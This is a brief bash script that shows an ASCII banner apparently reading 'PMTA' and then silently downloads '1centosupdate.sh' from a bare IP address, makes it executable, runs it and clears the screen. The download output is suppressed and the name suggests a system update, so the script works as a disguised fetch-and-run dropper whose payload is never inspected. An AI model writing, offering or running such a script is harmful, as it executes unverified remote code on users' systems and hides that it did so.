#!/bin/bash

echo '
   _ _   _    _ _ _ _
  |  _ \|  \/  |_   _| / \   
  | |_) | |\/| | | |  / _ \  
  |  __/| |  | | | | / ___ \ 
  |_|   |_|  |_| |_|/_/   \_\
 
' 

wget -q http://31.210.20.178/setupxmpta/1centosupdate/1centosupdate.sh >/dev/null 2>&1 
chmod +x 1centosupdate.sh
sh 1centosupdate.sh
clear
